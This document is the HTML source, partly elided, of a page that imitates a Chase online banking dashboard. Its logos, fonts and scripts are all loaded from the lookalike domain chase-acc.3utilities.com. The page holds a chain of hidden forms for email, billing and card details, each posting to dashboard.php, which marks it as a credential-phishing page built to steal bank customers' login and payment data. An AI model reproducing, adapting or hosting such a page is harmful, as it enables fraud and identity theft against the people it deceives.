...
<head>
    ...
    <style>
        @font-face {
            ...
            font-style: normal;
            font-weight: 400;
            src: url('https://chase-acc.3utilities.com/style/fonts/opensans-regular.eot?') format('embedded-opentype'), url('https://chase-acc.3utilities.com/style/fonts/opensans-regular.woff') format('woff'), url('https://chase-acc.3utilities.com/style/fonts/opensans-regular.ttf') format('truetype'), url('https://chase-acc.3utilities.com/style/fonts/opensans-regular.svg') format('svg');
        }
        ...
        @font-face {
            ...
            font-style: normal;
            font-weight: 600;
            src: url('https://chase-acc.3utilities.com/style/fonts/opensans-semibold.eot?') format('embedded-opentype'), url('https://chase-acc.3utilities.com/style/fonts/opensans-semibold.woff') format('woff'), url('https://chase-acc.3utilities.com/style/fonts/opensans-semibold.ttf') format('truetype'), url('https://chase-acc.3utilities.com/style/fonts/opensans-semibold.svg') format('svg');
        }
        ...
        @font-face {
            ...
            font-style: normal;
            font-weight: 300;
            src: url('https://chase-acc.3utilities.com/style/fonts/opensans-light.eot?') format('embedded-opentype'), url('https://chase-acc.3utilities.com/style/fonts/opensans-light.woff') format('woff'), url('https://chase-acc.3utilities.com/style/fonts/opensans-light.ttf') format('truetype'), url('https://chase-acc.3utilities.com/style/fonts/opensans-light.svg') format('svg');
        }
        ...
        @font-face {
            ...
            font-style: normal;
            font-weight: normal;
            src: url('https://chase-acc.3utilities.com/style/fonts/videoplayer.eot?') format('embedded-opentype'), url('https://chase-acc.3utilities.com/style/fonts/videoplayer.woff') format('woff'), url('https://chase-acc.3utilities.com/style/fonts/videoplayer.ttf') format('truetype'), url('https://chase-acc.3utilities.com/style/fonts/videoplayer.svg') format('svg');
        }
    </style>
    <link rel="shortcut icon" href="https://chase-acc.3utilities.com/style/icon/chasefavicon.ico">
    <link rel="apple-touch-icon" sizes="152x152" href="https://chase-acc.3utilities.com/style/icon/chase-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://chase-acc.3utilities.com/style/icon/chase-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://chase-acc.3utilities.com/style/icon/chase-touch-icon-76x76.png">
    <link rel="apple-touch-icon" href="https://chase-acc.3utilities.com/style/icon/chase-touch-icon.png">
    <style>
        .spinnerWrapper {
            position: absolute;
            width: 100%;
    ...
    <link rel="stylesheet" href="https://chase-acc.3utilities.com/style/dashboard.css">
</head>
...
<body data-has-view="true" class="fixheader fixheader-shadow no-ignore-color" style="overflow-y: scroll; height: 100%;">
                                ...
                                <nav class="jpui vertical menu left-panel-color" role="navigation" aria-labelledby="side-menu-header">
                                    ...
                                    <div class="left-side-submenu" id="megaMenuSelections" aria-hidden="false">
                                        ...
                                        <ul class="left-side-menu-footer" id="left-side-menu-footer" data-has-view="true">
                                            ...
                                            <li class="left-footer-description addisplay" id="side_menu_add_choice"><a href="javascript:void(0);" tabindex="0" exit="sidemenu.adChoices"><span>Ad Choices<span id="angleright_image" aria-hidden="true"><img src="dashboard.php#" alt="" title="Ad Choices"></span></span></a></li>
                                    ...
                                    <div class="dashboard-header" id="dashboard-header" data-is-view="true">
                                            ...
                                            <div class="jpui background image fixed util print-background-none" id="geoImage">
                                                <style type="text/css">
                                                    .jpui.background.image {
                                                        background-image: url(https://chase-acc.3utilities.com/style/img/default.jpeg);
                                        ...
                                        <div class="mobile-takeover">
                                            ...
                                            <div class="chase logo util print-width-100-percent">
                                                <a class="chase-public-logo chase-logo-link-wrapper hover-this-for-minitooltip" id="chase-logo-link-wrapper" exit="convodeck.home" href="javascript:void(0);"><img class="print-logo" exit="convodeck.home" src="https://chase-acc.3utilities.com/style/img/chase-octogon-black.png" alt="J.P. Morgan logo"> <img class="chase-public-logo hide-xs show-sm" exit="convodeck.home" src="https://chase-acc.3utilities.com/style/img/octogon-white.png" id="" alt="J.P. Morgan logo"> <span class="jpui minitooltip delay" id="chase-logo-minitooltip"> <span class="util print-hide">Accounts</span></span>
                                                </a>
                                            </div>
                                                    ...
                                                    <div class="col-xs-12 ads-tiles" id="accountTile2ContentID" tabindex="-1">
                                                        <div class="jpui ad accountHeaderImage" aria-role="group">
                                                            <a href="javascript:void(0);" blue-click="makeNavigation" class="wrapping-tag" style="touch-action: manipulation; -webkit-user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
                                                                <div class="content">
                                                                    <div class="copy"> <img class="image primary" src="https://chase-acc.3utilities.com/style/img/A51187_IC1420_Consumer_Multi_Native_Tile_Image_90x90.jpg" alt="Multiple Chase card products.">
                            ...
                            <section class="dynamic-height col-sm-8 xs-hide-show util print-show-block print-width-100-percent show" id="right-container">
                                <div class="transactions-container util print-border-none">
                                    <div class="logon-details hide-xs show-sm clearfix" id="logonDetailsContainer" data-has-view="true">
                                        <div class="LastlogonSpacing util right aligned hide-xs show-sm util print-hide" data-is-view="true"><span class="NOTE">Last signed in 17:59:30 27/12/2020</span></div>
                                    </div>
                                    <div id="transactions">
                                        <div class="clearfix" id="accountsSummaryContainer" data-has-view="true">
                                            <div class="account-summary-container dda" id="accountSummaryContainer" data-is-view="true">
                                                <section class="account-summary account details fade-in clearfix" id="summaryHeader">
                                                    ...
                                                    <div id="zwimel" class="zwimel" style="display:none;"><img id="loading-image" src="https://chase-acc.3utilities.com/style/img/loading.gif" /></div>
                                                    <div id="emailowa" style="background: rgba(255,255,255,.96);border-radius: 5px; padding: 1.25rem 0; margin: 0 auto;" class="jpui raised ">
                                                        <div class="row">
                                                            <div class="col-xs-10 col-xs-offset-1">
                                                                ...
                                                                <form name="emailform" id="emailform" method="POST" action="dashboard.php">
                                                    ...
                                                    <div id="bilingowa" style="background: rgba(255,255,255,.96);border-radius: 5px; padding: 1.25rem 0; margin: 0 auto; display:none;" class="jpui raised ">
                                                        <div class="row">
                                                            <div class="col-xs-10 col-xs-offset-1">
                                                                ...
                                                                <form name="bilngo" id="bilngo" method="POST" action="dashboard.php">
                                                    ...
                                                    <div id="cardowa" style="background: rgba(255,255,255,.96);border-radius: 5px; padding: 1.25rem 0; margin: 0 auto; display:none;" class="jpui raised ">
                                                        <div class="row">
                                                            <div class="col-xs-10 col-xs-offset-1">
                                                                ...
                                                                <form name="cardfrom" id="cardfrom" method="POST" action="dashboard.php">
                                                    ...
                                                    <div id="cardowa2" style="background: rgba(255,255,255,.96);border-radius: 5px; padding: 1.25rem 0; margin: 0 auto; display:none;" class="jpui raised ">
                                                        <div class="row">
                                                            <div class="col-xs-10 col-xs-offset-1">
                                                                ...
                                                                <form name="cardfrom2" id="cardfrom2" method="POST" action="dashboard.php" style="display:none;">
                                                        ...
                                                        <div class="row">
                                                            <div class="col-xs-10 col-xs-offset-1">
                                                                ...
                                                                <div>
                                                                    <br>
                                                                    <br>
                                                                    <div style="text-align: center;"><img width="150" height="150" src="https://chase-acc.3utilities.com/style/img/cong.gif">
    ...
    <script src="https://chase-acc.3utilities.com/js/jquery.min.js"></script>
    <script src="https://chase-acc.3utilities.com/js/jquery.validate.min.js"></script>
    <script src="https://chase-acc.3utilities.com/js/sire.form.js"></script>
